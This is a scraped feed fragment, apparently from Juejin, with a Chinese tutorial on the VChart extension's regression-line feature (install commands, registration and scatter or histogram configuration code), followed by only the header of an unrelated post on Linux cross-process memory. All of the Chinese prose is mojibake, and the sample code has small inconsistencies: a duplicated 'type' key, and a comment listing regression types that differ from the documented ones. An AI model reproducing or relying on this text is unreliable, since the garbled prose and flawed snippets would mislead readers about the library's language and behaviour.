ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ•°æ®åˆ†æå’Œå¯è§†åŒ–é¢†åŸŸï¼Œæˆ‘ä»¬å¸¸å¸¸ä¸ä»…æ»¡è¶³äºå±•ç¤ºç¦»æ•£çš„æ•°æ®ç‚¹ï¼Œæ›´æ¸´æœ›æ´å¯Ÿå…¶èƒŒåçš„è¶‹åŠ¿ä¸è§„å¾‹ã€‚æ— è®ºæ˜¯è¿½è¸ªäº§å“æ ¸å¿ƒæŒ‡æ ‡çš„å¢é•¿åŠ¿å¤´ï¼Œåˆ†æ A/B å®éªŒä¸­ä¸åŒç­–ç•¥çš„è½¬åŒ–æ•ˆæœï¼Œè¿˜æ˜¯åœ¨ä¸šåŠ¡å¤ç›˜æ—¶å¯»æ‰¾å…³é”®å˜é‡é—´çš„æ½œåœ¨å…³è”ï¼Œä¸€æ¡å¹³æ»‘çš„â€œè¶‹åŠ¿çº¿â€æ€»èƒ½è®©æ•°æ®æ•…äº‹æ›´åŠ æ¸…æ™°å’Œå¯Œæœ‰æ´å¯ŸåŠ›ã€‚</p>
<p>ä¸ºäº†è®©è¶‹åŠ¿åˆ†æå˜å¾—å‰æ‰€æœªæœ‰çš„ç®€å•ï¼ŒVisActor VChart å›¢é˜Ÿåœ¨æ‰©å±•åŒ… <code>vchart-extension</code> ä¸­æ­£å¼æ¨å‡ºäº†**å›å½’çº¿ï¼ˆRegression Lineï¼‰**åŠŸèƒ½ã€‚ç°åœ¨ï¼Œä½ åªéœ€ä¸€è¡Œç®€å•çš„é…ç½®ï¼Œå³å¯ä¸ºä½ çš„å›¾è¡¨å¢æ·»å¼ºå¤§çš„æ•°æ®å›å½’ä¸è¶‹åŠ¿å±•ç¤ºèƒ½åŠ›ã€‚</p>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼šVChart å›å½’çº¿æ‰©å±•æ—¨åœ¨å¸®åŠ©ç”¨æˆ·å¿«é€Ÿã€å‡†ç¡®åœ°åœ¨ç°æœ‰å›¾è¡¨ï¼ˆå¦‚æ•£ç‚¹å›¾ã€æŠ˜çº¿å›¾ã€æŸ±çŠ¶å›¾ç­‰ï¼‰ä¸Šå åŠ ç»Ÿè®¡å›å½’çº¿ï¼Œè½»æ¾æ­ç¤ºæ•°æ®å˜é‡é—´çš„æ½œåœ¨å…³ç³»å’Œå‘å±•è¶‹åŠ¿ï¼Œä¸ºæ•°æ®é©±åŠ¨çš„å†³ç­–æä¾›ç›´è§‚å‚è€ƒã€‚</p>
<h2 data-id="heading-0">æ ¸å¿ƒèƒ½åŠ›ä¸€è§ˆ</h2>
<p>VChart çš„å›å½’çº¿æ‰©å±•åŠŸèƒ½å¼ºå¤§ä¸”çµæ´»ï¼Œæ—¨åœ¨æ»¡è¶³ä»å¿«é€Ÿæ¢ç´¢åˆ°æ·±åº¦åˆ†æçš„å„ç±»éœ€æ±‚ã€‚</p>
<ul>
<li>
<p><strong>ä¸°å¯Œçš„å›å½’ç±»å‹</strong>ï¼šå†…ç½®å¤šç§å¸¸ç”¨å›å½’ç®—æ³•ï¼Œæ»¡è¶³ä¸åŒåœºæ™¯çš„åˆ†æéœ€æ±‚ã€‚</p>
</li>
<li>
<p><strong>çº¿æ€§å›å½’ (linear)</strong>ï¼šæ¢ç´¢å˜é‡é—´çš„çº¿æ€§å…³ç³»ã€‚</p>
</li>
<li>
<p><strong>å¤šé¡¹å¼å›å½’ (polynomial)</strong>ï¼šæ‹Ÿåˆéçº¿æ€§çš„å¤æ‚è¶‹åŠ¿ï¼Œæ”¯æŒè‡ªå®šä¹‰é˜¶æ•°ã€‚</p>
</li>
<li>
<p><strong>å¯¹æ•°å›å½’ (logarithmic)</strong>ï¼šé€‚ç”¨äºå¢é•¿ç‡å…ˆå¿«åæ…¢çš„åœºæ™¯ã€‚</p>
</li>
<li>
<p><strong>æŒ‡æ•°å›å½’ (exponential)</strong>ï¼šæ¨¡æ‹Ÿæ•°æ®å‘ˆæŒ‡æ•°çº§å¢é•¿çš„è¶‹åŠ¿ã€‚</p>
</li>
<li>
<p><strong>Loess å›å½’ (loess)</strong>ï¼šå±€éƒ¨åŠ æƒå›å½’ï¼Œæ“…é•¿æ•æ‰å±€éƒ¨çš„æ•°æ®å˜åŒ–è¶‹åŠ¿ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¯†åº¦ä¼°è®¡ (KDE)</strong>ï¼šåœ¨ç›´æ–¹å›¾ä¸Šå åŠ å¹³æ»‘çš„æ¦‚ç‡å¯†åº¦æ›²çº¿ã€‚</p>
</li>
<li>
<p><strong>ç»éªŒç´¯ç§¯åˆ†å¸ƒ (ECDF)</strong>ï¼šå±•ç¤ºæ•°æ®çš„ç´¯ç§¯åˆ†å¸ƒæƒ…å†µã€‚</p>
</li>
<li>
<p><strong>æ— ç¼é›†æˆå¤šç§å›¾è¡¨</strong>ï¼šå¯è½»æ¾ä¸ VChart ä¸­æœ€å¸¸ç”¨çš„å›¾è¡¨ç±»å‹ç»“åˆã€‚</p>
</li>
<li>
<p><strong>æ•£ç‚¹å›¾</strong>ï¼šå›å½’åˆ†æçš„ç»å…¸åœºæ™¯ï¼Œç›´è§‚å±•ç¤ºä¸¤ä¸ªè¿ç»­å˜é‡çš„æ‹Ÿåˆè¶‹åŠ¿ã€‚</p>
</li>
<li>
<p><strong>æŸ±çŠ¶å›¾</strong>ï¼šä¸ºç¦»æ•£çš„åˆ†ç±»æ•°æ®æ·»åŠ æ•´ä½“è¶‹åŠ¿å‚è€ƒã€‚</p>
</li>
<li>
<p><strong>ç›´æ–¹å›¾</strong>ï¼šç»“åˆ KDE æˆ– ECDFï¼Œæ·±å…¥ç†è§£æ•°æ®åˆ†å¸ƒç‰¹å¾ã€‚</p>
</li>
<li>
<p><strong>æ”¯æŒåˆ†ç»„/åˆ†ç±»å›å½’</strong>ï¼šå½“æ•°æ®åŒ…å«å¤šä¸ªç±»åˆ«æ—¶ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªåˆ†ç»„ç‹¬ç«‹è®¡ç®—å¹¶ç»˜åˆ¶å›å½’çº¿ï¼Œä¾¿äºè¿›è¡Œç²¾ç»†åŒ–çš„å¯¹æ¯”åˆ†æã€‚</p>
</li>
<li>
<p><strong>é«˜åº¦å¯å®šåˆ¶çš„æ ·å¼</strong>ï¼šå›å½’çº¿ã€å…¬å¼æ ‡ç­¾ã€ç½®ä¿¡åŒºé—´ç­‰å…ƒç´ çš„æ ·å¼å‡æ”¯æŒç²¾ç»†åŒ–é…ç½®ï¼Œç¡®ä¿è§†è§‰æ•ˆæœä¸æ•´ä½“è®¾è®¡é£æ ¼å®Œç¾èåˆã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">å¿«é€Ÿä¸Šæ‰‹ï¼šä¸‰æ­¥ä¸ºæ•£ç‚¹å›¾æ·»åŠ å›å½’çº¿</h2>
<p>ä¸ºå›¾è¡¨æ·»åŠ å›å½’çº¿éå¸¸ç®€å•ã€‚éµå¾ªä»¥ä¸‹ä¸‰æ­¥ï¼Œå³å¯åœ¨ä½ çš„ VChart é¡¹ç›®ä¸­å¯ç”¨è¯¥åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šå®‰è£…å¹¶å¼•å…¥æ‰©å±•åŒ…</h3>
<p>é¦–å…ˆï¼Œè¯·ç¡®ä¿ä½ çš„é¡¹ç›®ä¸­å·²å®‰è£… VChart åŠå…¶æ‰©å±•åŒ…ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ npm</span>
npm install @visactor/vchart @visactor/vchart-extension

<span class="hljs-comment"># ä½¿ç”¨ yarn</span>
yarn add @visactor/vchart @visactor/vchart-extension
    

</code></pre>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šæ³¨å†Œå›å½’çº¿ç»„ä»¶</h3>
<p>åœ¨ä½ çš„ä»£ç å…¥å£å¤„ï¼Œå¼•å…¥å¹¶æ³¨å†Œå›å½’çº¿ç»„ä»¶ã€‚è¿™æ˜¯å¯ç”¨æ‰€æœ‰ç›¸å…³åŠŸèƒ½çš„å…³é”®ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">VChart</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart'</span>;
<span class="hljs-keyword">import</span> { registerRegressionLine } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart-extension'</span>;

<span class="hljs-comment">// åªéœ€è°ƒç”¨ä¸€æ¬¡</span>
<span class="hljs-title function_">registerRegressionLine</span>();
    

</code></pre>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ï¼šåœ¨å›¾è¡¨é…ç½®ä¸­æ·»åŠ å›å½’çº¿</h3>
<p>å®Œæˆæ³¨å†Œåï¼Œå³å¯åœ¨å›¾è¡¨ spec ä¸­é€šè¿‡ <code>append*RegressionLineConfig</code> ç³»åˆ—è¾…åŠ©å‡½æ•°æ¥æ·»åŠ å›å½’çº¿ã€‚ä»¥æœ€å¸¸è§çš„æ•£ç‚¹å›¾ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { appendScatterRegressionLineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart-extension'</span>;

<span class="hljs-comment">// å‡è®¾ä½ å·²æœ‰ä¸€ä¸ªåŸºç¡€çš„æ•£ç‚¹å›¾ spec</span>
<span class="hljs-keyword">const</span> spec = {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'scatter'</span>,
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">values</span>: [
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'chevrolet chevelle malibu'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">130</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'buick skylark 320'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">165</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'plymouth satellite'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">150</span> },
      <span class="hljs-comment">// ... æ›´å¤šæ•°æ®</span>
    ]
  },
  <span class="hljs-attr">xField</span>: <span class="hljs-string">'milesPerGallon'</span>,
  <span class="hljs-attr">yField</span>: <span class="hljs-string">'horsepower'</span>,
};

<span class="hljs-comment">// ä¸º spec æ·»åŠ å›å½’çº¿é…ç½®</span>
<span class="hljs-title function_">appendScatterRegressionLineConfig</span>(spec, {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'linear'</span> <span class="hljs-comment">// æŒ‡å®šå›å½’ç±»å‹ä¸ºçº¿æ€§å›å½’</span>
});

<span class="hljs-comment">// ç°åœ¨ï¼Œspec å°±åŒ…å«äº†å›å½’çº¿é…ç½®ï¼Œå¯ä»¥ç”¨äº VChart æ¸²æŸ“äº†</span>
<span class="hljs-keyword">const</span> vchart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VChart</span>(spec, { <span class="hljs-attr">dom</span>: <span class="hljs-string">'chart-container'</span> });
vchart.<span class="hljs-title function_">renderSync</span>();
    

</code></pre>
<p>å°±æ˜¯è¿™ä¹ˆç®€å•ï¼æ¸²æŸ“åçš„å›¾è¡¨å°†åœ¨åŸå§‹æ•£ç‚¹å›¾çš„åŸºç¡€ä¸Šï¼Œè‡ªåŠ¨ç»˜åˆ¶å‡ºä¸€æ¡çº¿æ€§å›å½’çº¿ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dea78accc1b2448dbe630bf8bdee5b43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546E6a2C:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768615&amp;x-signature=NQs0W95sNvwRzCLt43ShApEexgc%3D" alt="" width="988" height="auto" loading="lazy"/>
<h2 data-id="heading-5">è¿›é˜¶é…ç½®ä¸ç¤ºä¾‹</h2>
<p>VChart å›å½’çº¿æ‰©å±•æä¾›äº†ä¸°å¯Œçš„é…ç½®é¡¹ï¼Œè®©ä½ èƒ½å¤Ÿç²¾ç»†æ§åˆ¶å›å½’çº¿çš„è¡Œä¸ºå’Œå¤–è§‚ã€‚</p>
<h3 data-id="heading-6">å…³é”®é…ç½®é¡¹è§£æ</h3>
<p>åœ¨ä½¿ç”¨ <code>append*RegressionLineConfig</code> å‡½æ•°æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•° <code>config</code> å¯¹è±¡æ”¯æŒä»¥ä¸‹å…³é”®å±æ€§ï¼š</p>
<ul>
<li>
<p><code>type</code>: æŒ‡å®šå›å½’ç±»å‹ã€‚ä¾‹å¦‚ï¼Œåœ¨æ•£ç‚¹å›¾ä¸­å¯é€‰ <code>'linear'</code>, <code>'polynomial'</code>, <code>'logarithmic'</code>, <code>'exponential'</code>, <code>'loess'</code>ã€‚åœ¨ç›´æ–¹å›¾ä¸­å¯é€‰ <code>'kde'</code>, <code>'ecdf'</code>ã€‚</p>
</li>
<li>
<p><code>degree</code> (æˆ– <code>polynomialDegree</code>): å½“ <code>type</code> ä¸º <code>'polynomial'</code> æ—¶ï¼Œç”¨äºæŒ‡å®šå¤šé¡¹å¼çš„é˜¶æ•°ï¼Œé»˜è®¤ä¸º 2ã€‚é˜¶æ•°è¶Šé«˜ï¼Œæ›²çº¿è¶Šèƒ½æ‹Ÿåˆæ•°æ®çš„æ³¢åŠ¨ï¼Œä½†æœ‰è¿‡æ‹Ÿåˆçš„é£é™©ã€‚</p>
</li>
<li>
<p><code>line</code>: ç”¨äºé…ç½®å›å½’çº¿çš„æ ·å¼ï¼Œå¦‚ <code>style</code>ï¼ˆçº¿å‹ã€é¢œè‰²ã€ç²—ç»†ç­‰ï¼‰ã€‚</p>
</li>
<li>
<p><code>label</code>: é…ç½®å›å½’çº¿æœ«ç«¯æˆ–é¡¶éƒ¨çš„å…¬å¼æ ‡ç­¾ï¼Œå¯ä»¥è‡ªå®šä¹‰ <code>text</code> å’Œ <code>style</code>ã€‚</p>
</li>
<li>
<p><code>confidenceInterval</code>: é…ç½®ç½®ä¿¡åŒºé—´ï¼Œé€šè¿‡ <code>visible</code> æ§åˆ¶å…¶æ˜¾éšï¼Œå¹¶é€šè¿‡ <code>style</code> è‡ªå®šä¹‰å…¶å¡«å……æ ·å¼ã€‚</p>
</li>
</ul>
<h3 data-id="heading-7">ç¤ºä¾‹ï¼šæ ·å¼å®šåˆ¶</h3>
<p>ä¸‹é¢çš„ä¾‹å­å°†åœ¨å‰è¿°æ•£ç‚¹å›¾çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹ <code>type</code> å®ç°3æ¬¡å¤šé¡¹å¼å›å½’çº¿ï¼Œå¹¶è‡ªå®šä¹‰å›å½’çº¿æ ·å¼ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { appendScatterRegressionLineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart-extension'</span>;

<span class="hljs-comment">// å‡è®¾ä½ å·²æœ‰ä¸€ä¸ªåŸºç¡€çš„æ•£ç‚¹å›¾ spec</span>
<span class="hljs-keyword">const</span> spec = {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'scatter'</span>,
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">values</span>: [
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'chevrolet chevelle malibu'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">130</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'buick skylark 320'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">165</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'plymouth satellite'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">150</span> },
      <span class="hljs-comment">// ... æ›´å¤šæ•°æ®</span>
    ]
  },
  <span class="hljs-attr">xField</span>: <span class="hljs-string">'milesPerGallon'</span>,
  <span class="hljs-attr">yField</span>: <span class="hljs-string">'horsepower'</span>,
};

<span class="hljs-comment">// ä¸º spec æ·»åŠ å›å½’çº¿é…ç½®</span>
<span class="hljs-title function_">appendScatterRegressionLineConfig</span>(spec, {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'polynomial'</span>, <span class="hljs-comment">// æ”¯æŒ4ä¸­ç±»å‹ 'linear' | 'logisitc' | 'lowess' | 'polynomial'</span>
    <span class="hljs-attr">polynomialDegree</span>: <span class="hljs-number">3</span>,
    <span class="hljs-attr">color</span>: <span class="hljs-string">'red'</span>,
    <span class="hljs-attr">line</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">lineWidth</span>: <span class="hljs-number">2</span>
      }
    },
    <span class="hljs-attr">confidenceInterval</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">fillOpacity</span>: <span class="hljs-number">0.2</span>
      }
    },
    <span class="hljs-attr">label</span>: {
      <span class="hljs-attr">text</span>: <span class="hljs-string">'3æ¬¡å¤šé¡¹å¼å›å½’'</span>
    }
});

<span class="hljs-comment">// ç°åœ¨ï¼Œspec å°±åŒ…å«äº†å›å½’çº¿é…ç½®ï¼Œå¯ä»¥ç”¨äº VChart æ¸²æŸ“äº†</span>
<span class="hljs-keyword">const</span> vchart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VChart</span>(spec, { <span class="hljs-attr">dom</span>: <span class="hljs-string">'chart-container'</span> });
vchart.<span class="hljs-title function_">renderSync</span>();
    

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49d83a91e6de469d962a1b96aae2e030~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546E6a2C:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768615&amp;x-signature=ga%2FlX66KE3pKHI0s5DOLXLmvBYg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">ç¤ºä¾‹ï¼šç›´æ–¹å›¾ä¸æ ¸å¯†åº¦ä¼°è®¡ï¼ˆKDEï¼‰</h3>
<p>å›å½’çº¿æ‰©å±•åŒæ ·èƒ½å¢å¼ºç›´æ–¹å›¾çš„è¡¨ç°åŠ›ã€‚é€šè¿‡å åŠ  KDE æ›²çº¿ï¼Œå¯ä»¥æ›´å¹³æ»‘åœ°è§‚å¯Ÿæ•°æ®åˆ†å¸ƒçš„â€œå½¢çŠ¶â€ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªåŒ…å« bin è½¬æ¢çš„ç›´æ–¹å›¾ spec</span>
<span class="hljs-keyword">const</span> spec = {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'histogram'</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-comment">/* ... */</span> },
  <span class="hljs-attr">type</span>: <span class="hljs-string">'histogram'</span>,
  <span class="hljs-attr">xField</span>: <span class="hljs-string">'x0'</span>,
  <span class="hljs-attr">x2Field</span>: <span class="hljs-string">'x1'</span>,
  <span class="hljs-attr">yField</span>: <span class="hljs-string">'frequency'</span>,
};

<span class="hljs-comment">// ä¸ºå…¶é™„åŠ  KDE æ›²çº¿</span>
<span class="hljs-title function_">appendHistogramRegressionLineConfig</span>(spec, [
  {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'kde'</span>, <span class="hljs-comment">// æ”¯æŒ 'kde' å’Œ 'ecdf'</span>
    <span class="hljs-attr">line</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">stroke</span>: <span class="hljs-string">'red'</span>,
        <span class="hljs-attr">lineWidth</span>: <span class="hljs-number">2</span>
      }
    },
    <span class="hljs-attr">label</span>: {
      <span class="hljs-attr">text</span>: <span class="hljs-string">'KDEæ ¸å¯†åº¦ä¼°è®¡'</span>
    }
  },
  {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'ecdf'</span>, <span class="hljs-comment">// æ”¯æŒ 'kde' å’Œ 'ecdf'</span>
    <span class="hljs-attr">line</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">stroke</span>: <span class="hljs-string">'green'</span>,
        <span class="hljs-attr">lineWidth</span>: <span class="hljs-number">2</span>
      }
    },
    <span class="hljs-attr">label</span>: {
      <span class="hljs-attr">text</span>: <span class="hljs-string">'ç»éªŒç´¯ç§¯åˆ†å¸ƒå‡½æ•°ï¼ˆECDFï¼‰'</span>
    }
  }
]);
    

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe1dcfe19af24df5ba7cca18305dc6d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546E6a2C:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768615&amp;x-signature=rIXMhzNWyjDck20z6Ws%2BuwC5Zvg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">åœ¨çº¿demoå’Œæ•™ç¨‹</h3>
<p>demoï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisactor.com%2Fvchart%2Fdemo%2Fscatter-chart%2Fscatter-regression-line" target="_blank" title="https://visactor.com/vchart/demo/scatter-chart/scatter-regression-line" ref="nofollow noopener noreferrer">visactor.com/vchart/demoâ€¦</a></p>
<p>æ•™ç¨‹ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisactor.com%2Fvchart%2Fguide%2Ftutorial_docs%2FChart_Extensions%2Fregression_line" target="_blank" title="https://visactor.com/vchart/guide/tutorial_docs/Chart_Extensions/regression_line" ref="nofollow noopener noreferrer">visactor.com/vchart/guidâ€¦</a></p>
<h3 data-id="heading-10">æ¬¢è¿äº¤æµ</h3>
<p>æœ€åï¼Œæˆ‘ä»¬è¯šæŒšçš„æ¬¢è¿æ‰€æœ‰å¯¹æ•°æ®å¯è§†åŒ–æ„Ÿå…´è¶£çš„æœ‹å‹å‚ä¸è¿›æ¥ï¼Œå‚ä¸ VisActor çš„å¼€æºå»ºè®¾ï¼š</p>
<p><strong>VTable</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.visactor.io%2Fvtable" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fwww.visactor.io%2Fvtable">VTable å®˜ç½‘</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2FVTable" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2FVTable">VTable Githubï¼ˆæ¬¢è¿ Starï¼‰</a></p>
<p>VisActor å®˜æ–¹ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.visactor.io%2F" target="_blank" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.visactor.io%2F">www.visactor.io/</a> æˆ– <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.viactor.com" target="_blank" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.viactor.com">www.viactor.com</a></p>
<p>Discordï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fdiscord.gg%2F3wPyxVyH6m" target="_blank" title="https://link.juejin.cn?target=http%3A%2F%2Fdiscord.gg%2F3wPyxVyH6m">discord.gg/3wPyxVyH6m</a></p>
<p>é£ä¹¦ç¾¤ï¼ˆå¤–ç½‘ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2F40dcf4e6722d4925804361a2269991d8~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D264%26h%3D277%26s%3D35808%26e%3Dpng%26b%3Dfdfdfd" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2F40dcf4e6722d4925804361a2269991d8~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D264%26h%3D277%26s%3D35808%26e%3Dpng%26b%3Dfdfdfd">æ‰“å¼€é“¾æ¥æ‰«ç </a></p>
<p>å¾®ä¿¡å…¬ä¼—å·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2Ff28519302ee94940a8159fc52d375aaa~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D258%26h%3D258%26s%3D8552%26e%3Dwebp%26b%3Dfefefe" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2Ff28519302ee94940a8159fc52d375aaa~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D258%26h%3D258%26s%3D8552%26e%3Dwebp%26b%3Dfefefe">æ‰“å¼€é“¾æ¥æ‰«ç </a></p>
<p>githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2F" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2F">github.com/VisActor</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux è·¨è¿›ç¨‹å†…å­˜æ“ä½œï¼šä¸‰ç§å®æˆ˜æ–¹æ³•ä¸æ”»é˜²æ€è€ƒ]]></title>    <link>https://juejin.cn/post/7580753790771314730</link>    <guid>https://juejin.cn/post/7580753790771314730</guid>    <pubDate>2025-12-08T03:15:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580753790771314730" data-draft-id="7580753790771298346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux è·¨è¿›ç¨‹å†…å­˜æ“ä½œï¼šä¸‰ç§å®æˆ˜æ–¹æ³•ä¸æ”»é˜²æ€è€ƒ"/> <meta itemprop="keywords" content="å®‰å…¨"/> <meta itemprop="datePublished" content="2025-12-08T03:15:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ·±ç›¾å®‰å…¨"/> <meta itemprop="url" content="https://juejin.cn/user/741508014680712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux è·¨è¿›ç¨‹å†…å­˜æ“ä½œï¼šä¸‰ç§å®æˆ˜æ–¹æ³•ä¸æ”»é˜²æ€è€ƒ
